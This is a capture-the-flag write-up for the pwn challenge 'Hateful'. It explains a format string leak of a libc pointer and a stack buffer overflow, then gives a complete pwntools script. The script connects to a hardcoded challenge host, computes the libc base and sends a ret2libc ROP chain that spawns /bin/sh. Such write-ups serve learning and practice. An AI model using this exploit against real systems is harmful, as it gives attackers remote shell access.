# Challenge: Hateful

## Category: Pwn

## Challenge description
You hate your Boss??? You wanna just trash talk him but you are afraid he would fire you???
Dont worry we got you! send us the message you want to send him and we will take care of everything for you!

## Files given
- hateful: Main ELF file
- libc.so.6: Libc file
- ld-linux-x86-64.so.2: dynamic linker

## Examination
- First, lets checksec to see security mitigations of the file:
``` console
$ checksec --file=hateful        
[*]
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
- So we can exploit the stack, also PIE is disabled

## Solution
- First, to simulate the server environment, we can use patchelf to dynamically link the ELF to proper libc and linker version
- Reversing the binary, we can see a format string vulnerability, and we get a large payload to overflow the buffer
- Hence, without win() function, we need to take advantage from libc
- The format string vulnerability helps us leak arbitrary addresses on the stack. By using GDB retaddr, we can see that the 171-th argument on stack is a pointer to libc.
- After that, libc base address can be calculated as well as rop gadgets address 

## Exploit Script
```python
from pwn import *
host = '52.59.124.14'
port = 5020

libc = ELF('./libc.so.6')
binsh_offset = next(libc.search(b"/bin/sh\x00"))
rop = ROP(libc)
address_rdi = rop.rdi.address
address_system = libc.symbols['system']
address_ret = rop.ret.address
def solve():
        p = remote(host=host, port=port)
        print(p.recv().decode())
        p.sendline(b'yay')

        print(p.recv().decode())
        p.sendline(b"%171$llx")
        print(p.recvuntil(b'email provided: ').decode())
        address_leaked = int('0x' + p.recvuntil(b'\n')[:-1].decode(), 16)
        log.info('Leaked address: ' +  hex(address_leaked))
        libc_base = address_leaked - libc.symbols['__libc_start_main'] - 133
        log.info('Libc base address: ' + hex(libc_base))
        print(p.recv().decode())

        padding = b'A' * 1016
        payload = padding + p64(address_ret + libc_base) +  p64(address_rdi + libc_base) + p64(binsh_offset + libc_base) + p64(address_system + libc_base)
        p.sendline(payload)
        p.interactive() 
solve()



```